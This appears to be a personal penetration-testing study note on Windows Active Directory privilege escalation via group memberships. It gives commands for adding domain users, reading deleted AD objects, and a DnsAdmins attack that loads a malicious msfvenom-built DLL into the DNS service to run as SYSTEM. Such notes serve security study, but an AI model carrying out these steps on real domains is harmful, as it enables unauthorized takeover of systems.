---
type: info
scope: [privesc]
aliases: []
related: []
created: 15-03-2023 17:32
---
%%
related::
%%

#todo 

## Overview
- When enumerating users should find their group memberships
	- Certain groups can exploit for privesc
- Notes
	- *When forget groups, just Google `<group> exploit`*

## Privileged Groups
1. [[#1. Account Operators]]
2. [[#AD Recycle Bin]]

### 1. Account Operators
- Add domain users (non-admins)
	- `net user add <name> <password> /domain`

### 2. AD Recycle Bin
- Read deleted AD objects
	- `Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *`

## 3. DnsAdmins
- Can load malicious DLL to DNS server that runs on startup
	1. Upload DLL
	2. Restart DNS
- DNS is usually run as the `SYSTEM` user which has **Administrator privileges**
- Generating DLL
	- [[Metasploit|msfvenom]]
	- [[Netcat|nc]]
- Transferring DLL
	- [[Kali-Win File Transfer]]

**Steps**
```powershell
# 1. get hostname
hostname

# 2. load dll
dnscmd.exe \\<hostname> /config /serverlevelplugindll <dll_path>

# 3. restart dns
sc.exe \\<hostname> stop dns
sc.exe \\<hostname> query dns
sc.exe \\<hostname> start dns

# note
# - \\<hostname> might work with IP addresses
```

## References
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
